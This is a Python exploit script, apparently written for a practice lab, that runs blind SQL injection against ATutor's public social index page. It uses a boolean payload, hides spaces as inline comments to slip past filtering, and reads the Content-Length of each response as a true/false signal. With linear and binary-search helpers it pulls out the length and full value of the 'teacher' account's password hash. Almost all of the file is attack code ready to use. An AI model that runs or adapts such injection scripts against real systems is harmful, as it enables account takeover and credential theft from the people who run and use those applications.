from queries import QUERIES
from bsqli import blind_query
from bsqli import question
from bsqli import get_length
from bsqli import get_count
from bsqli import binary_search
from bsqli import get_string
import requests

req = lambda url: requests.get(url)
conditional_error = lambda response: int(response.headers['Content-Length']) == 180
blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
url = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
query_encoder = lambda s: s.replace(' ','/**/')

teacher_hash_query = "select password from AT_members where login='teacher'"
# example using blind_query
ret = blind_query(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    sub_query=QUERIES['MYSQL']['LENGTH_EXFIL'](teacher_hash_query, 39),
    query_encoder=query_encoder,
    comment="%23",
    debug=False
)
'''
False Test Using Blind Query
'''
print(F"length of teacher has = 39? {ret}")
ret = blind_query(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    sub_query=QUERIES['MYSQL']['LENGTH_EXFIL'](teacher_hash_query,40),
    query_encoder=query_encoder,
    comment="%23",
    debug=False
)
print(F"length of teacher has = 40? {ret}")
'''
False Test using Question
'''
ret = question(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    sub_query=QUERIES['MYSQL']['LENGTH_EXFIL'](teacher_hash_query, 39),
    query_encoder=query_encoder,
    comment="%23",
    debug=False
)
print(F"length of teacher has = 39? {ret}")
'''
True Test using Question
'''
ret = question(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    sub_query=QUERIES['MYSQL']['LENGTH_EXFIL'](teacher_hash_query,40),
    query_encoder=query_encoder,
    comment="%23",
    debug=False
)
print(F"length of teacher has = 40? {ret}")
'''
O(n) get length test
'''
hash_len = get_length(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    outer_query=QUERIES['MYSQL']['LENGTH_EXFIL'],
    inner_query=teacher_hash_query,
    query_encoder=query_encoder,
    comment="%23",
    debug=False
    )
print(F"Length of teacher hash: {hash_len}")
'''
O(log(n)) binary_search get length
'''
# binary search
hash_len = binary_search(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    outer_query=QUERIES['MYSQL']['LENGTH_EXFIL_BIN'],
    inner_query=teacher_hash_query,
    query_encoder=query_encoder,
    lo=1,
    hi=100,
    comment="%23",
    debug=False
)
print(F"Length of teacher hash this time binary search: {hash_len}")
'''
O(log(n)) binary_search get string
'''
teacher_hash = get_string(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    outer_query=QUERIES['MYSQL']['STR_EXFIL'],
    inner_query=teacher_hash_query,
    strlen=hash_len,
    query_encoder=query_encoder,
    comment="%23",
    debug=False
)
print(F"Extracted teacher hash: {teacher_hash}")